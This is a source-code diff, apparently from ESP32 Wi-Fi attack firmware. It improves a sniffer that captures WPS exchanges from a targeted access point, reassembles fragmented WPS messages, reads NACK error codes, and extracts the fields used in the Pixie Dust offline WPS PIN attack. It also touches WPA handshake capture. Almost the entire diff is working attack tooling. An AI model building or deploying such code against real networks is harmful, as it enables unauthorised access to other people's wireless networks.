@@ -221,7 +221,7 @@ bool isWpsFrame(const wifi_promiscuous_pkt_t *pkt) {
     int offset = 24;
     uint8_t fc0 = p[0];
     bool isData  = (fc0 & 0x0C) == 0x08;          // frame type = Data
-    bool isQoS   = (fc0 & 0x80) != 0;             // subtype bit7 set = QoS
+    bool isQoS   = (fc0 & 0x88) == 0x88;          // Data AND QoS subtype (bit3 of subtype set)
     if (isData && isQoS) offset += 2;
 
     // Need: LLC/SNAP(8) + EAPOL-hdr(4) + EAP-hdr(5) + Expanded(7) = 24
@@ -243,13 +243,24 @@ bool isWpsFrame(const wifi_promiscuous_pkt_t *pkt) {
     if (p[offset + 4] != 0xFE) return false;  // EAP type byte
     offset += 5;
 
-    // Wi-Fi Alliance WSC Vendor-ID: 00 37 2A, Vendor-Type: 00 00 00 01
-    if (offset + 7 > len) return false;
-    if (p[offset]   != 0x00 || p[offset+1] != 0x37 || p[offset+2] != 0x2A) return false;
-    if (p[offset+3] != 0x00 || p[offset+4] != 0x00 ||
-        p[offset+5] != 0x00 || p[offset+6] != 0x01) return false;
+    // Vendor-ID check — three outer forms observed in the wild for this AP:
+    //   Standard WFA WSC:    00 37 2A  (+ VendorType 00 00 00 01)
+    //   WSC-Start shell:     00 01 01  (outer only; tiny 4-byte payload, no TLVs)
+    //   Double-wrap WSC_MSG: 2A 00 01  (8-byte inner header at payload[0], then TLVs)
+    // Accept all three — parseWpsPixieData handles each offset separately.
+    if (offset + 3 > len) return false;
+    bool isStandardWfa   = (p[offset]==0x00 && p[offset+1]==0x37 && p[offset+2]==0x2A);
+    bool isDoubleWrap    = (p[offset]==0x2A && p[offset+1]==0x00 && p[offset+2]==0x01);
+    bool isWscStartShell = (p[offset]==0x00 && p[offset+1]==0x01 && p[offset+2]==0x01);
+    bool isTPLinkScrambled = (offset + 7 <= len &&
+                              p[offset+4] == 0x00 &&
+                              p[offset+5] == 0x37 &&
+                              p[offset+6] == 0x2A);
 
-    return true;
+    if (!isStandardWfa && !isDoubleWrap && !isWscStartShell && !isTPLinkScrambled) {
+        return false;
+    }
+    return true;   // ←←← THIS WAS MISSING
 }
 
 
@@ -287,15 +298,14 @@ void wps_reassembly_reset() {
 
 // Walk the fully-reassembled WPS TLV buffer and extract pixie fields.
 static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
+    if (bufLen >= 6) {
+        Serial.printf("[Debug-Parse] Hex TLV buffer start: %02X %02X %02X %02X %02X %02X\n",
+                    buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
+    }
     int offset = 0;
     while (offset + 4 <= bufLen) {
         uint16_t attr_type = ((uint16_t)buf[offset] << 8) | buf[offset+1];
         uint16_t attr_len  = ((uint16_t)buf[offset+2] << 8) | buf[offset+3];
-
-        if (bufLen >= 6) {
-            Serial.printf("[Debug-Parse] Hex payload header: %02X %02X %02X %02X %02X %02X\n",
-                        buf[0], buf[1], buf[2], buf[3], buf[4], buf[5]);
-        }
 
         offset += 4;
         if (offset + attr_len > bufLen) {
@@ -373,106 +383,186 @@ static bool parseTlvBuffer(const uint8_t *buf, int bufLen) {
     return hasMinimal;
 }
 
+
+
+
 // Parse WPS frames for Pixie Dust data — with fragment reassembly.
 bool parseWpsPixieData(const wifi_promiscuous_pkt_t *pkt) {
+    if (!pkt) return false;
+
     const uint8_t *p   = pkt->payload;
+    // ESP-IDF promiscuous sig_len does NOT include the 802.11 FCS trailer.
+    // Subtracting 4 here removes 4 bytes of real payload, shrinking 'len' so that
+    // tlvBytes = 0 for short frames and the TLV parser never fires.
     const int      len = (int)pkt->rx_ctrl.sig_len;
 
-    if (len < 26) return false;
+    if (len < 40) return false;
 
-    // Debug: log frames from our target AP
-    if (memcmp(p+10, pixieCapture.bssid, 6) == 0) {
-        Serial.printf("[Pixie] Frame from AP: FC=%02X%02X len=%d\n",
-                      p[0], p[1], len);
-    }
+    // Only process frames FROM the AP (FromDS=1, addr2=BSSID).
+    // Ignoring our own M1 transmissions prevents the sniffer from
+    // misidentifying them as M2 and corrupting reassembly state.
+    // FC byte 1: bit1 = FromDS, bit0 = ToDS
+    // AP→STA (downlink): ToDS=0, FromDS=1 → FC[1] & 0x03 == 0x02
+    bool fromAP = ((p[1] & 0x03) == 0x02) && (memcmp(p+10, pixieCapture.bssid, 6) == 0);
+    if (!fromAP) return false;
+    Serial.printf("[Pixie] Frame from AP: FC=%02X%02X len=%d\n", p[0], p[1], len);
 
     if (!isWpsFrame(pkt)) return false;
     Serial.println("[Pixie] isWpsFrame=true, parsing TLVs...");
 
-    // ---- Determine 802.11 header length ----
+    // 802.11 header length
     uint8_t fc0 = p[0];
     uint8_t fc1 = p[1];
     bool isData = (fc0 & 0x0C) == 0x08;
-    bool isQoS  = (fc0 & 0x80) != 0;
+    bool isQoS  = (fc0 & 0x88) == 0x88;
     int  macHdr = 24 + (isData && isQoS ? 2 : 0);
 
-    // More-Fragments bit: FC byte 1, bit 2 (0x04)
     bool moreFrags = (fc1 & 0x04) != 0;
-
-    // 802.11 sequence control: bytes [22..23], little-endian
-    // Upper 12 bits = sequence number, lower 4 bits = fragment number
     uint16_t seqCtrl    = (uint16_t)p[22] | ((uint16_t)p[23] << 8);
     uint16_t seqNumber  = (seqCtrl >> 4) & 0x0FFF;
-    uint8_t  fragNumber = seqCtrl & 0x0F;
 
-    // ---- Skip to WPS TLV payload ----
-    // macHdr + LLC/SNAP(8) + EAPOL-hdr(4) + EAP-hdr(5) + EAP-type(1) +
-    // Vendor-ID(3) + Vendor-Type(4) + Op-Code(1) + Flags(1) = macHdr + 27
+    // Outer VID location
+    int vidOffset = macHdr + 8 + 4 + 4 + 1;
+    bool outerIsWscStartShell = (vidOffset + 3 <= len &&
+                                 p[vidOffset]==0x00 && p[vidOffset+1]==0x01 && p[vidOffset+2]==0x01);
+    bool outerIsDoubleWrap    = (vidOffset + 3 <= len &&
+                                 p[vidOffset]==0x2A && p[vidOffset+1]==0x00 && p[vidOffset+2]==0x01);
+
     int offset = macHdr + 8 + 4 + 5 + 3 + 4 + 1;
     if (offset + 1 > len) return false;
 
-    uint8_t wscFlags = p[offset];  // This will now correctly read the Flags byte at index 49
-    offset++;                      // skip Flags to point to index 50 (Start of TLVs)
-
-    // WPS fragmentation flag: bit 0 of wscFlags
-    bool wpsMoreFrag = (wscFlags & 0x01) != 0;
-    // Message-Length flag: bit 1 — present only in the FIRST fragment of a sequence
-    bool wpsHasLen   = (wscFlags & 0x02) != 0;
-    if (wpsHasLen) offset += 2;    // skip 2-byte total WPS message length
-
-    if (offset > len) return false;
-    const uint8_t *tlvStart = p + offset;
-    int            tlvBytes  = len - offset;
-
-    // ---- Reassembly logic ----
-    // Start a new reassembly if:
-    //   - This is fragment 0 of a new sequence number (first 802.11 fragment), OR
-    //   - We were not in the middle of a reassembly (single-frame message)
-    bool isFirstFragment = (fragNumber == 0);
-
-    if (isFirstFragment) {
-        // Begin (or restart) reassembly for this sequence number
-        g_wpsReassemblyLen    = 0;
-        g_wpsReassemblySeq    = seqNumber;
-        g_wpsReassemblyActive = (moreFrags || wpsMoreFrag);
-        Serial.printf("[Pixie] Reassembly start: seq=%u moreFrags=%d wpsMoreFrag=%d tlvBytes=%d\n",
-                      seqNumber, moreFrags, wpsMoreFrag, tlvBytes);
-    } else {
-        // Continuation fragment — must match current reassembly sequence
-        if (seqNumber != g_wpsReassemblySeq || !g_wpsReassemblyActive) {
-            Serial.printf("[Pixie] Unexpected continuation frag seq=%u (expected %u)\n",
-                          seqNumber, g_wpsReassemblySeq);
-            return false;
+    // TP-Link Scrambled VID Detection
+    bool isTPLinkScrambled = false;
+    if (!outerIsWscStartShell) {
+        int vidCheck = vidOffset;
+        if (vidCheck + 7 <= len &&
+            p[vidCheck+4] == 0x00 && p[vidCheck+5] == 0x37 && p[vidCheck+6] == 0x2A) {
+            isTPLinkScrambled = true;
+            Serial.println("[Pixie] Detected TP-Link scrambled VID");
         }
-        Serial.printf("[Pixie] Reassembly cont: seq=%u frag=%u tlvBytes=%d\n",
-                      seqNumber, fragNumber, tlvBytes);
     }
 
-    // Append this fragment's TLV payload to the reassembly buffer
-    if (tlvBytes > 0) {
-        int copy = tlvBytes;
-        if (g_wpsReassemblyLen + copy > WPS_REASSEMBLY_BUF) {
-            copy = WPS_REASSEMBLY_BUF - g_wpsReassemblyLen;
-            Serial.printf("[Pixie] Reassembly buffer full — truncating to %d\n", WPS_REASSEMBLY_BUF);
+    uint8_t wscFlags = p[offset];
+    offset++;  // skip outer Flags
+
+    if (outerIsWscStartShell) return false;
+
+    if (outerIsDoubleWrap) {
+        if (offset + 8 > len) return false;
+        if (p[offset]==0x37 && p[offset+1]==0x2A && p[offset+2]==0x00) {
+            wscFlags = p[offset + 7];
+            offset += 8;
+            Serial.println("[Pixie] Double-wrap: skipped 8-byte inner header");
+        } else {
+            Serial.printf("[Pixie] Double-wrap unexpected inner[0:3]=%02X%02X%02X\n",
+                        p[offset], p[offset+1], p[offset+2]);
+            return false;
         }
+    }
+
+    // TP-Link extra prefix skip
+    if (isTPLinkScrambled) {
+        if (offset + 2 > len) return false;
+        offset += 1;  // skip REAL OpCode; wscFlags will be re-read below
+        Serial.println("[Pixie] Skipped TP-Link OpCode byte");
+        // Re-read real Flags only for TP-Link (standard already read correctly above)
+        if (offset >= len) return false;
+        wscFlags = p[offset];
+        offset++;
+    }
+
+    // WPS fragmentation flags
+    bool wpsMoreFrag = (wscFlags & 0x01) != 0;
+    bool wpsHasLen   = (wscFlags & 0x02) != 0;
+    if (wpsHasLen) {
+        if (offset + 2 > len) return false;
+        offset += 2;
+    }
+
+    if (offset > len) return false;
+
+    const uint8_t *tlvStart = p + offset;
+    int            tlvBytes = len - offset;
+
+    // Reassembly logic
+    if (wpsHasLen) {
+        g_wpsReassemblyLen    = 0;
+        g_wpsReassemblySeq    = seqNumber;
+        g_wpsReassemblyActive = wpsMoreFrag;
+        Serial.printf("[Pixie] WPS Fragmented Stream Started seq=%u wpsMoreFrag=%d tlvBytes=%d\n", seqNumber, wpsMoreFrag, tlvBytes);
+    } else if (g_wpsReassemblyActive) {
+        if (seqNumber != g_wpsReassemblySeq) {
+            Serial.printf("[Pixie] Dropping stray frame seq=%u (active seq=%u)\n", seqNumber, g_wpsReassemblySeq);
+            return false;
+        }
+        Serial.printf("[Pixie] WPS Continuation Fragment seq=%u wpsMoreFrag=%d tlvBytes=%d\n", seqNumber, wpsMoreFrag, tlvBytes);
+    } else {
+        if (tlvBytes > 0) {
+            g_wpsReassemblyLen = 0;
+            g_wpsReassemblySeq = seqNumber;
+        } else {
+            return false;
+        }
+    }
+
+    if (tlvBytes > 0) {
+        int copy = std::min(tlvBytes, WPS_REASSEMBLY_BUF - g_wpsReassemblyLen);
         if (copy > 0) {
             memcpy(g_wpsReassemblyBuf + g_wpsReassemblyLen, tlvStart, copy);
             g_wpsReassemblyLen += copy;
         }
     }
 
-    // If more fragments are coming, wait for them
-    if (moreFrags || wpsMoreFrag) {
-        Serial.printf("[Pixie] Waiting for more fragments (%d bytes so far)\n", g_wpsReassemblyLen);
-        return false;
+    if (wpsMoreFrag) return false;
+
+    Serial.printf("[Pixie] WPS Reassembly complete: %d bytes total\n", g_wpsReassemblyLen);
+
+    // === Debug small packets (NACKs are small) ===
+    if (g_wpsReassemblyLen < 200) {
+        Serial.print("[Pixie] Small packet first bytes: ");
+        for (int i = 0; i < std::min(48, g_wpsReassemblyLen); ++i) {
+            Serial.printf("%02X ", g_wpsReassemblyBuf[i]);
+        }
+        Serial.println();
     }
 
-    // All fragments received — walk the complete TLV stream
-    Serial.printf("[Pixie] Reassembly complete: %d bytes total\n", g_wpsReassemblyLen);
-    g_wpsReassemblyActive = false;
+    // Message type debug + NACK reason
+    if (g_wpsReassemblyLen >= 10) {
+        if (g_wpsReassemblyBuf[5] == 0x10 && g_wpsReassemblyBuf[6] == 0x22) {
+            uint8_t msgType = g_wpsReassemblyBuf[9];
+            Serial.printf("[Debug-WPS] Message Type: 0x%02X ", msgType);
+            if (msgType == 0x05) Serial.println("(M2 - Success)");
+            else if (msgType == 0x0E) {
+                Serial.print("(WSC_NACK) ");
+                int scanOff = 0;
+                while (scanOff + 4 <= g_wpsReassemblyLen) {
+                    uint16_t t = ((uint16_t)g_wpsReassemblyBuf[scanOff]<<8) | g_wpsReassemblyBuf[scanOff+1];
+                    uint16_t l = ((uint16_t)g_wpsReassemblyBuf[scanOff+2]<<8) | g_wpsReassemblyBuf[scanOff+3];
+                    if (t == 0x1009 && l == 2 && scanOff + 6 <= g_wpsReassemblyLen) {
+                        uint16_t cfgErr = ((uint16_t)g_wpsReassemblyBuf[scanOff+4]<<8) | g_wpsReassemblyBuf[scanOff+5];
+                        const char *reason = "Unknown";
+                        switch (cfgErr) {
+                            case 0x0000: reason = "No Error"; break;
+                            case 0x0002: reason = "Decrypt/CRC Fail"; break;
+                            case 0x0005: reason = "Auth Failure"; break;
+                            case 0x0006: reason = "Msg Timeout"; break;
+                            case 0x0008: reason = "DevPassword Failure"; break;
+                            // add more if you want
+                        }
+                        Serial.printf("ConfigError=0x%04X (%s)\n", cfgErr, reason);
+                        break;
+                    }
+                    scanOff += 4 + l;
+                }
+            }
+            else Serial.printf("(Other: 0x%02X)\n", msgType);
+        }
+    }
 
+    g_wpsReassemblyActive = false;
     return parseTlvBuffer(g_wpsReassemblyBuf, g_wpsReassemblyLen);
 }
+
 HandshakeTracker hsTracker;
 
 bool handshakeUsable(const HandshakeTracker &hs) { // EAPOL Messages needed: 1+2 or 3+4
